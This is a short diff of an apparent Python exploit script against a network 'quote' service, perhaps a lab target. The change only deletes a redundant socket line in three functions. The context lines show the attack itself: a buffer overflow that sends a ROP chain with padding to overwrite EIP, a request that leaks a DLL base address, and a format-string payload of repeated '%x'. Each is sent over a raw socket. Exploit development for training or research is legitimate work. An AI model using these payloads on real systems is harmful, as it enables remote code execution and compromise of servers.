@@ -139,8 +139,6 @@ def overflowEIP(server,port,baseDll):
     
     buf += rop + b"D" * (0x4000 - len(buf) - len(rop)) # Padding
 
-    s = socket.socket()
-
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((server,port))
     s.send(buf)
@@ -155,8 +153,6 @@ def leakBaseDll(server,port,quote_index):
     buf += pack("<L",(quote_index)) # Data Index argument for get_quote
     buf += b"A" * (0x200 - len(buf))
 
-    s = socket.socket()
-
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((server,port))
     s.send(buf)
@@ -168,8 +164,6 @@ def leakBaseDll(server,port,quote_index):
 def add_quote(server,port):
     buf = pack("<L",(0x386)) # opcode -> add_quote
     buf += b"%x" * (0x200 - len(buf))
-
-    s = socket.socket()
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((server,port))
